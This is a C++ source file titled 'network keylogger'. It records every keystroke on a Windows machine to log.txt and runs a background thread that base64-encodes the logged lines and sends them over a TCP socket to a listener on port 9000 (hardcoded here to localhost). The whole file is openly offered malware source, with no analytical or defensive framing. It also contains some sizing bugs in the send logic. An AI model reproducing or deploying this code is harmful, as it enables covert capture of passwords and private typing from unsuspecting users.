/***************************************************************************************
*    Title: network keylogger
*    Author: Marcel Mendes
*    Date: Feb 18, 2021
*   ***************************************************************************************/

#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string>
#include <fstream>
#include <pthread.h>

#include "base64.h"

//#include <thread>
//#include <mutex>

#define True 1

//GLOBAL
//std::mutex mtx;

using namespace std;

void *send_file(void *){
    int port = 9000;
    sockaddr_in servAddr;
    SOCKET connfd;
    WSADATA wsaData;
    ifstream in;

    WSAStartup(MAKEWORD(2,0), &wsaData);

    connfd = socket(AF_INET, SOCK_STREAM, 0);
	
    memset(&servAddr, 0, sizeof(servAddr));

    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(port);
    servAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(connfd, (sockaddr*) &servAddr, sizeof(servAddr));

    in.open("log.txt", ios::in);
    while(True){
        if(in.is_open()){
	    string line;
            while(std::getline(in, line)){	
	        string encoded = base64_encode((unsigned char const*) line.c_str(), sizeof(line));
		send(connfd, encoded.c_str(), sizeof(encoded) + 1, 0);
	    }
	}
        Sleep(5000); //5 sec
    }
    closesocket(connfd);
    WSACleanup();
}

int main(){
	
    int count = 0;
    ofstream out;

    //std::thread thread(send_file);
    pthread_t thread;
    int i = pthread_create(&thread, NULL, send_file, (void *) 0);

    out.open("log.txt", ios::app);

    while(True){
        for(char key = 0x8; key < 0xFF; key++){
	    if(GetAsyncKeyState(key) == -32767){
	        std::string skey(1,key);
		out << skey;
		count++;
	    }
	    if(count == 15){
	        out << '\n';
		out.flush();
		count = 0;
	    }
	}
	Sleep(10); //0.01 sec
    }

    system("PAUSE");
    return EXIT_SUCCESS;
}
